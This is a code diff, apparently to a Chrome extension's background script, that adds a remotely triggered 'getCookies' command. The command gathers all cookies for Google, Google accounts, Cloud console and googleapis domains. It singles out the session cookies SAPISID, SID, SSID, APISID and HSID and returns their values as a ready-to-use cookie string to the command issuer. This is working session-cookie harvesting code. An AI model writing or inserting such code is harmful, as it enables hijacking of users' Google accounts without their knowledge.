@@ -221,6 +221,11 @@ async function handleCommand(data) {
         result = { success: true, data: dataUrl };
         break;
         
+      case 'getCookies':
+        // 获取Google相关Cookie
+        result = await this.getAllGoogleCookies();
+        break;
+        
       default:
         result = { success: false, message: `未知命令: ${command}` };
     }
@@ -235,6 +240,87 @@ async function handleCommand(data) {
       command: command,
       result: result
     }));
+  }
+}
+
+// 获取所有Google相关域名的Cookie
+async function getAllGoogleCookies() {
+  try {
+    console.log('开始获取Google相关域名的所有Cookie...');
+    
+    // Google相关的所有域名
+    const googleDomains = [
+      '.google.com',
+      'google.com',
+      '.accounts.google.com',
+      'accounts.google.com',
+      '.console.cloud.google.com',
+      'console.cloud.google.com',
+      '.googleapis.com',
+      'googleapis.com',
+      '.gstatic.com',
+      'gstatic.com'
+    ];
+    
+    let allCookies = [];
+    let cookieMap = new Map(); // 用于去重
+    
+    // 从所有Google域名获取Cookie
+    for (const domain of googleDomains) {
+      try {
+        const cookies = await chrome.cookies.getAll({ domain: domain });
+        console.log(`域名 ${domain} 找到 ${cookies.length} 个Cookie`);
+        
+        // 添加到总列表，使用Map去重
+        cookies.forEach(cookie => {
+          const key = `${cookie.name}_${cookie.domain}`;
+          if (!cookieMap.has(key)) {
+            cookieMap.set(key, cookie);
+            allCookies.push(cookie);
+          }
+        });
+      } catch (domainError) {
+        console.warn(`获取域名 ${domain} Cookie失败:`, domainError.message);
+      }
+    }
+    
+    console.log(`总共找到 ${allCookies.length} 个唯一Cookie`);
+    
+    // 检查关键Cookie
+    const criticalCookies = ['SAPISID', 'SSID', 'SID', 'APISID', 'HSID'];
+    const foundCritical = [];
+    
+    allCookies.forEach(cookie => {
+      if (criticalCookies.includes(cookie.name)) {
+        foundCritical.push(cookie.name);
+        console.log(`找到关键Cookie: ${cookie.name}`);
+      }
+    });
+    
+    // 将Cookie格式化为字符串
+    let cookieString = '';
+    allCookies.forEach(cookie => {
+      if (cookieString) cookieString += '; ';
+      cookieString += `${cookie.name}=${cookie.value}`;
+    });
+    
+    console.log('Cookie字符串长度:', cookieString.length);
+    console.log('找到的关键Cookie:', foundCritical.join(', '));
+    
+    return {
+      success: true,
+      cookies: cookieString,
+      cookieCount: allCookies.length,
+      criticalCookies: foundCritical,
+      message: `成功获取 ${allCookies.length} 个Cookie`
+    };
+    
+  } catch (error) {
+    console.error('获取Cookie出错:', error);
+    return {
+      success: false,
+      message: `获取Cookie失败: ${error.message}`
+    };
   }
 }
 
